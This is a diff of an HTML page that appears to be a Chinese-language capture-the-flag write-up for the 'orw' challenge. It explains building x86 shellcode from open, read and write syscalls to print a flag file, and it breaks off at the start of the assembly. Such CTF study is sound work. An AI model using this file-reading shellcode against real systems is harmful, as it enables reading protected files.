@@ -1072,18 +1072,24 @@
 <h2 id="solution">Solution</h2>
 <p>最後我選擇參考 <a href="https://syscalls.kernelgrok.com/">x86 syscall</a> 逐步構造出 <code>open</code> <code>read</code> <code>write</code> </p>
 <ul>
-<li><code>open(file='esp', oflag='O_RDONLY', mode=0)</code></li>
+<li><code>open(file='esp', oflag='O_RDONLY', mode=0)</code><ul>
 <li>這個我採用 pwntool 輸出的寫法</li>
-<li><code>read(fd, buf, length)</code></li>
+</ul>
+</li>
+<li><code>read(fd, buf, length)</code><ul>
 <li><code>eax</code> 是 0x3</li>
 <li><code>fd</code> 存在 <code>open()</code> 的回傳結果 (<code>eax</code>)</li>
 <li><code>buf</code> 選在 <code>esp</code></li>
 <li><code>length</code> 是 60</li>
-<li><code>write(stdout, buf, length)</code></li>
+</ul>
+</li>
+<li><code>write(stdout, buf, length)</code><ul>
 <li><code>eax</code> 是 0x4</li>
 <li><code>stdout</code> 是 1</li>
 <li><code>buf</code> 是剛剛讀取的 <code>esp</code></li>
 <li><code>length</code> 是 60</li>
+</ul>
+</li>
 </ul>
 <div class="highlight"><pre><span></span>/* push &#39;/home/orw/flag\x00&#39; */
         push 0x1010101
